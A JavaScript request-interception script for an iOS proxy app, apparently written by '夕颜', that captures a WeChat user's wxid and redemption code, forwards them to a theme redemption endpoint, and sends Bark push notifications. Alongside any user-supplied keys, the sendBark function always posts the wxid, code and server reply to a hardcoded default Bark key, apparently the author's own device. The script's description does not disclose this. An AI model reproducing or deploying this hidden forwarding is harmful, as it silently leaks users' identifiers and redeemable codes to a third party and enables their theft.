// 夕颜编写 - 微信兑换拦截并通知（支持传参自定义Title和多BarkKey）

let body = $request.body;
let json;

try {
  json = JSON.parse(body);
} catch {
  $done({ response: { body: '{"message":"请求体格式错误"}' } });
  return;
}

const wxid = json.wxid || "未知wxid";
const rawCode = json.code || "";
const code = rawCode.startsWith("TB") ? rawCode : "TB" + rawCode;

const url = "https://theme.25mao.com/index/redeem";
const headers = { "Content-Type": "application/json" };
const requestBody = JSON.stringify({ wxid, code });

$httpClient.post({ url, headers, body: requestBody }, (_, __, data) => {
  let msg = "无返回信息";
  try {
    const res = JSON.parse(data);
    msg = res.message || msg;
  } catch {}

  const title = $argument.title ? $argument.title.trim() : "by夕颜";
  const bodyText = `盒子兑换通知\nwxid: ${wxid}\ncode: ${code}\n返回: ${msg}`;
  
  // 本地通知
  $notification.post(title, "", bodyText);
  
  // Bark 通知
  sendBark(title, bodyText);

  $done({
    response: {
      body: data
    }
  });
});

function sendBark(title, bodyText) {
  const defaultBarkKey = "tZjWy8x2DekUG57vNBbQFm";  

  const barkKeysFromArg = ($argument.barkKey || "")
    .split(/\n+/)
    .map(x => x.trim())
    .filter(Boolean);

  const allBarkKeys = [defaultBarkKey, ...barkKeysFromArg];

  const barkIcon = "https://img.xiyan.pro/i/u/2025/04/17/IMG_7887.png";

  allBarkKeys.forEach(key => {
    const barkUrl = `https://api.day.app/${key}/${encodeURIComponent(title)}/${encodeURIComponent(bodyText)}?icon=${encodeURIComponent(barkIcon)}`;
    $httpClient.get(barkUrl, (err, resp, data) => {
      if (err) {
        console.log(`❌ Bark 通知发送失败: ${key}`, err);
      } else {
        console.log(`✅ Bark 通知发送成功: ${key}`);
      }
    });
  });
}
